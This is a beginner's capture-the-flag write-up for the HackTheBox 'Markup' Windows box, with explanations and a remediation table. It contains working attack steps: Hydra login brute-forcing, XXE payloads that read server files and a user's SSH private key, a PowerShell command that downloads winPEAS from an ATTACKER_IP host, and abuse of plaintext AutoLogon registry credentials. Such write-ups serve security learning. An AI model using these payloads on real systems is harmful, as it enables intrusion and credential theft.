@@ -1,0 +1,333 @@
+# HackTheBox — MARKUP
+
+**Difficulty:** Easy
+**OS:** Windows
+**Category:** Web Application (XXE) → Windows Privilege Escalation
+**Author:** Majda Sassi — written for people new to security
+
+---
+
+## 1. Introduction
+
+MARKUP is a beginner-friendly Windows box built around a single core vulnerability class: **XML External Entity (XXE) injection**. It's a great box for learning the full attack chain that a lot of real-world web application compromises follow: weak credentials get you into an application, a parsing vulnerability in that application lets you read files off the server's disk, one of those files contains a private SSH key, and that key gets you a full interactive shell — from which normal Windows privilege escalation techniques take over.
+
+I'm writing this up because I want to explain *why* each step works, not just *what command* I ran. If you're new to security like I am, I hope this saves you some of the head-scratching I went through.
+
+> **Note on flags:** In line with HTB's guidelines, the actual flag values are redacted below (shown as `[REDACTED]`). This keeps the challenge fair for others who haven't solved it yet.
+
+---
+
+## 2. Reconnaissance
+
+Every engagement starts with figuring out what's actually running on the target. I used `nmap` for this:
+
+```bash
+nmap -sC -sV 10.129.95.192
+```
+
+**Results:**
+
+| Port | Service | Version |
+|------|---------|---------|
+| 22   | SSH     | OpenSSH for_Windows_8.1 |
+| 80   | HTTP    | Apache 2.4.41 (Win64) + PHP 7.2.28 — "MegaShopping" |
+| 443  | HTTPS   | Same as above, over TLS |
+
+**What this told me before touching anything else:**
+- This is a **Windows** host (not Linux) running SSH — that's slightly unusual, since SSH is more commonly associated with Linux. Windows has shipped an official OpenSSH server since Windows 10 1809 / Server 2019, so this told me the box was likely a fairly modern Windows Server build, and that **SSH was almost certainly going to be my route in once I had valid credentials**, rather than something I'd need to exploit directly.
+- The web server is running **XAMPP** (Apache + PHP bundle for Windows) rather than IIS — a strong hint that this box's vulnerability would live in custom PHP code, not a Windows-native web stack.
+- Two open web ports (80 and 443) serving the same content suggested one application, just also available over TLS.
+
+---
+
+## 3. Web Application Enumeration
+
+Visiting the site showed a login page for "MegaShopping" with no other visible content — no registration page, no obvious other endpoints.
+
+**What I tried first, and why:**
+
+1. **SQL injection** (`admin' OR 1=1--` style payloads) — this is a fast, low-cost thing to rule out early on any login form, since it's one of the most common ways to bypass authentication if input isn't sanitized. It didn't work here, which told me the login form was probably parameterizing its database queries correctly (or wasn't backed by SQL for auth at all).
+2. Since SQLi failed and there was no other visible attack surface, I moved to **credential brute-forcing** with Hydra:
+
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.95.192 \
+  http-post-form "/:username=^USER^&password=^PASS^:F=Wrong Credentials"
+```
+
+**Result:** `admin : password` — a genuinely weak, default-feeling credential pair. This worked because there was no rate-limiting or account lockout on the login form, which let Hydra try thousands of passwords without being blocked.
+
+> **Why this matters:** this is the first "real-world" lesson in the box. Weak passwords combined with no brute-force protection is one of the most common ways real applications get breached — it's unglamorous, but it's often the actual root cause behind headline breaches.
+
+Once logged in, the only meaningful functionality was an **order form** that submitted raw XML to the server:
+
+```xml
+<?xml version="1.0"?>
+<order>
+  <quantity>1</quantity>
+  <item>Home Appliances</item>
+  <address>whatever street</address>
+</order>
+```
+
+Any time an application accepts raw XML from the user and parses it server-side, **XXE is worth testing for**.
+
+---
+
+## 4. Exploitation: XML External Entity (XXE) Injection
+
+### 4.1 What XXE actually is (for readers new to this)
+
+XML lets you define custom "entities" — essentially reusable placeholders — inside a `<!DOCTYPE>` declaration. Normally these are used for harmless things like inserting a repeated piece of text. But if the entity's value is defined as `SYSTEM "file:///some/path"`, and the XML parser is configured to resolve external entities, the parser will **read that file from the server's disk and substitute its contents wherever the entity is referenced** — and if the application then reflects any part of the parsed document back to the user, you can read arbitrary files the web server process has permission to access.
+
+This is exactly what happened here.
+
+### 4.2 First attempt (and why it failed)
+
+My first payload replaced the entire original document structure instead of working within it:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
+<r>&xxe;</r>
+```
+
+This produced a PHP error rather than the file contents:
+
+```
+Warning: DOMDocument::loadXML(): Extra content at the end of the document...
+Notice: Trying to get property 'quantity' of non-object...
+```
+
+**Why this failed, and why the error was still useful:** the application's backend code (which I later recovered — see Section 4.4) expects the submitted XML to still contain `<order>`, `<quantity>`, `<item>`, and `<address>` elements, because it explicitly reads `$order->quantity`, `$order->item`, etc. after parsing. My payload replaced the whole structure with `<r>&xxe;</r>`, so those properties didn't exist on the resulting object — hence "Trying to get property of non-object." Critically though, **the DOCTYPE and entity declaration parsed without complaint**, which confirmed the parser *was* processing external entities — I just wasn't injecting the payload in a way the rest of the application could use.
+
+**The lesson:** when working with XXE against a real application (as opposed to a generic textbook POC), you generally need to **preserve the application's expected document structure** and inject your entity into an *existing* field, not invent new top-level elements.
+
+### 4.3 Working payload
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
+<order>
+  <quantity>1</quantity>
+  <item>&xxe;</item>
+  <address>whatever street</address>
+</order>
+```
+
+This returned the contents of `win.ini` reflected back inside the application's normal "Your order for [item] has been processed" response — confirming full, in-band, readable XXE.
+
+**Two mistakes I made and want to flag explicitly, because I made both of them again by accident on a later replay of the box:**
+
+1. **Forgetting the `SYSTEM` keyword.** `<!ENTITY xxe "file:///...">` (without `SYSTEM`) defines an *internal* entity whose value is literally that string of text — it does **not** fetch a file. `SYSTEM` is what tells the parser "the value of this entity lives at this external location, go fetch it."
+2. **Using backslashes instead of forward slashes** in the file path (`C:\Users\...` instead of `C:/Users/...`). Even though the target OS is Windows, the value inside a `file://` URI needs to follow **URI syntax**, not Windows path syntax — and URI syntax uses forward slashes universally, regardless of the underlying operating system. Backslashes in a URI are either invalid or get interpreted as escape characters, which breaks the lookup.
+
+### 4.4 Reading the application's own source code
+
+Once file read was confirmed, I wanted to understand the application's logic itself, not just guess at file paths. Directly reading `.php` files via `file://` doesn't work well, because the **web server executes PHP files rather than serving their raw text** — so a normal `file://` read would just show you the *output* of the script, or nothing useful, not the source code.
+
+The fix is PHP's **`php://filter`** wrapper, which can be chained with `convert.base64-encode` to return a file's raw source as base64 text *before* PHP ever executes it:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE order [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=C:/xampp/htdocs/process.php">]>
+<order>
+  <quantity>1</quantity>
+  <item>&xxe;</item>
+  <address>whatever street</address>
+</order>
+```
+
+Decoding the returned base64 revealed `process.php`:
+
+```php
+<?php
+include("db.php");
+session_start();
+if (!$_SESSION["loggedin"]) {
+    header('location: /index.php');
+} else {
+    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+        libxml_disable_entity_loader(false);
+        $xmlfile = file_get_contents('php://input');
+        $dom = new DOMDocument();
+        $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+        $order = simplexml_import_dom($dom);
+        $quantity = $order->quantity;
+        $item = $order->item;
+        $addr = $order->address;
+        echo "Your order for $item has been processed";
+    }
+}
+```
+
+**This is the root cause of the entire vulnerability**, in one line:
+
+```php
+libxml_disable_entity_loader(false);
+```
+
+This call explicitly **enables** external entity loading. Combined with the `LIBXML_NOENT | LIBXML_DTDLOAD` flags on `loadXML()` — which tell the parser to substitute entities and load external DTDs — the application is deliberately configured in the least safe way possible for handling untrusted XML input.
+
+### 4.5 Escalating to the SSH private key
+
+Earlier, browsing the site's HTML source had revealed a developer comment: `<!-- Modified by Daniel : UI-Fix-9092-->`. Combined with knowing this was a Windows box, that gave a strong candidate path for an SSH key:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///C:/Users/daniel/.ssh/id_rsa">]>
+<order>
+  <quantity>1</quantity>
+  <item>&xxe;</item>
+  <address>whatever street</address>
+</order>
+```
+
+This returned a complete `OPENSSH PRIVATE KEY` block. I saved it locally and used it to authenticate over SSH as `daniel`:
+
+```bash
+chmod 400 id_rsa
+ssh -i id_rsa daniel@10.129.95.192
+```
+
+**Why `chmod 400` matters:** SSH clients enforce that a private key file is not readable by anyone other than its owner (`400` = owner can read, no one else has any access). If a key's permissions are too open, `ssh` will refuse to use it entirely:
+
+```
+@ WARNING: UNPROTECTED PRIVATE KEY FILE! @
+Permissions 0664 for 'id_rsa' are too open.
+```
+
+This isn't a server-side check — it's the **client** protecting you, on the assumption that a world-readable private key file is a sign the key may have already been exposed to other users/processes on the same machine.
+
+This authenticated me as `daniel` and gave me the user flag:
+
+```
+type C:\Users\daniel\Desktop\user.txt
+[REDACTED]
+```
+
+---
+
+## 5. Privilege Escalation (daniel → Administrator)
+
+With a foothold established, the next goal is escalating from a standard user to `Administrator`/`SYSTEM`.
+
+### 5.1 Automated enumeration
+
+I used **winPEAS** (the Windows equivalent of `linpeas`), transferred to the box via PowerShell's `Invoke-WebRequest` from a Python HTTP server I hosted on my attacking machine:
+
+```powershell
+powershell -c "Invoke-WebRequest -Uri 'http://ATTACKER_IP:1337/winPEASany.exe' -OutFile 'C:\Users\daniel\Desktop\winpeas.exe'"
+```
+
+Running it surfaced a large amount of system information, but two findings stood out as directly exploitable.
+
+### 5.2 Finding 1: AutoLogon credentials in the registry
+
+```
+Some AutoLogon credentials were found
+    DefaultUserName : Administrator
+    DefaultPassword : [REDACTED]
+```
+
+**What this is:** Windows supports an "auto-logon" feature, typically configured for kiosks, test VMs, or automated environments, where the OS logs a specific user in automatically at boot without a password prompt. To make this work, the credentials are stored **in plaintext** in the registry, under:
+
+```
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+```
+
+This is a known, common misconfiguration — convenient for admins setting up a machine, but a significant credential exposure if any other account can read the registry (which, by default, most local users can, since this hive isn't ACL-restricted against standard users).
+
+winPEAS also flagged:
+
+```
+LocalAccountTokenFilterPolicy: 1
+[+] Any local account can be used for lateral movement.
+```
+
+This registry value controls **User Account Control (UAC) remote restrictions**. When set to `1`, it disables a protection that would normally prevent local (non-domain) accounts from being used for privileged remote administration (e.g., over WinRM). With it enabled, any valid local account — including the Administrator account whose password I now had — could be used to fully authenticate remotely at admin level.
+
+### 5.3 Attempt 1: WinRM (Evil-WinRM)
+
+Since port 5985 (WinRM) was open, I first tried:
+
+```bash
+evil-winrm -i 10.129.95.192 -u Administrator -p '[REDACTED]'
+```
+
+This repeatedly timed out (`HTTPClient::ConnectTimeoutError`). I verified the box and network path were otherwise healthy:
+
+```bash
+ping 10.129.95.192        # succeeded, normal latency
+nmap -p 5985 10.129.95.192  # returned "filtered"
+```
+
+A **filtered** port (as opposed to closed) generally means packets are being silently dropped, most often by a firewall rule — either on the target itself or somewhere in the network path — rather than by the service not running. I didn't dig further into *why* WinRM was filtered on this particular instance, since I had a working alternative, but this is a useful troubleshooting distinction to know: "connection timeout" + "filtered" together point to a network/firewall block, not bad credentials (which would instead produce an authentication error).
+
+### 5.4 Attempt 2: SSH as Administrator (successful)
+
+Since the box already runs an SSH server, and I had valid Administrator credentials from the registry, I simply tried the more direct route:
+
+```bash
+ssh Administrator@10.129.95.192
+```
+
+This succeeded immediately and dropped me into an Administrator-level `cmd.exe` session, from which I retrieved the root flag:
+
+```
+type C:\Users\Administrator\Desktop\root.txt
+[REDACTED]
+```
+
+**Reflection:** WinRM is the "expected" educational path for this kind of finding on many write-ups, but it's worth remembering that **privilege escalation isn't about using the most sophisticated tool — it's about using whatever the credentials and open services actually allow.** SSH being open and me already holding valid creds for it made it the simpler, equally valid path.
+
+### 5.5 A second technique I explored for learning purposes: writable scheduled task script
+
+Independent of the AutoLogon path, winPEAS also flagged:
+
+```
+File Permissions "C:\Log-Management\job.bat": Users [Allow: AllAccess]
+```
+
+This is a batch script, outside any standard XAMPP or user directory, that any member of the `Users` group (including `daniel`) can fully modify. Its contents were:
+
+```bat
+@echo off
+FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
+IF (%adminTest%)==(Access) goto noAdmin
+for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
+echo Event Logs have been cleared!
+goto theEnd
+:noAdmin
+echo You must run this script as an Administrator!
+```
+
+The script's purpose (clearing Windows Event Logs) only makes sense if it's run with administrative rights, and it lives in a custom, non-default directory — both strong signals that it's very likely invoked by a **scheduled task running as SYSTEM**, even though a low-privileged user like `daniel` doesn't have permission to view that task's definition directly (`schtasks /query` at the root folder returned `"no scheduled tasks presently available at your access level"` — a permissions limitation, not proof the task doesn't exist).
+
+**The underlying technique — writable file + higher-privileged automated execution = privilege escalation** — is a pattern that shows up constantly, in both Windows (scheduled tasks, services with unquoted/writable paths) and Linux (cron jobs, SUID scripts). Because the AutoLogon path had already given me root, I didn't need to weaponize this one for this box, but the identification process is the reusable skill here.
+
+---
+
+## 6. Root Cause Summary & Remediation
+
+| Weakness | Root Cause | Remediation |
+|---|---|---|
+| **Weak login credentials** | `admin:password` with no lockout policy | Enforce strong password policy; add account lockout/rate-limiting after failed attempts; consider MFA |
+| **XXE in `process.php`** | `libxml_disable_entity_loader(false)` explicitly enables external entity resolution, combined with `LIBXML_NOENT \| LIBXML_DTDLOAD` | Never disable the entity loader; explicitly disable DTD loading and external entities (`libxml_disable_entity_loader(true)` on older PHP, or simply omit `LIBXML_DTDLOAD`/`LIBXML_NOENT` on modern PHP where external entities are disabled by default); validate/sanitize any XML from untrusted sources; consider a non-DOM parser if raw XML input isn't strictly required |
+| **World-readable SSH private key location** | `id_rsa` accessible to the web server process's file-read scope | Ensure private keys are stored with restrictive filesystem ACLs so the web server account cannot read another user's `.ssh` directory |
+| **Plaintext AutoLogon credentials** | AutoLogon feature stores Administrator password in cleartext in the registry | Disable AutoLogon in production/exposed environments; if required, use a Group Policy-managed alternative or ensure the host is fully network-isolated |
+| **`LocalAccountTokenFilterPolicy` = 1** | Disables UAC remote-restriction protections for local accounts | Set this back to default (`0`) unless there's a specific, documented operational need, since it significantly widens what a compromised local credential can do remotely |
+| **World-writable scheduled task script** | `C:\Log-Management\job.bat`, run with elevated rights, is modifiable by standard users | Apply least-privilege NTFS permissions so only Administrators can modify scripts invoked by privileged scheduled tasks |
+
+---
+
+## 7. Key Takeaways
+
+- **Read your error messages.** The very first "failed" XXE payload was actually a success signal — it confirmed entity resolution was happening, even though the output wasn't useful yet. Distinguishing "this technique doesn't work" from "this technique works but I'm using it wrong" is a core debugging skill in this field.
+- **`SYSTEM` and forward-slash URI syntax matter mechanically**, not stylistically — both mistakes silently break the exploit rather than throwing an obviously related error.
+- **`php://filter` is invaluable for reading a target's own source code** through an XXE/LFI primitive, since raw file reads on server-executed script files don't return anything useful.
+- **Privilege escalation is a discovery-then-decision process.** Enumeration (winPEAS) surfaced multiple viable paths; the actual escalation step is often just picking the most direct one available, not necessarily the most "textbook" technique.
+- **Understanding the attacker chain end-to-end is more valuable than memorizing payloads.** Each step here built directly on information gathered in the previous one (comment → username → XXE path guess → source code → key location).
+
+---
+
+*Write-up by Majda Sassi. Completed as part of self-study in offensive security, August 2026. Flags redacted in accordance with HackTheBox's write-up guidelines.*
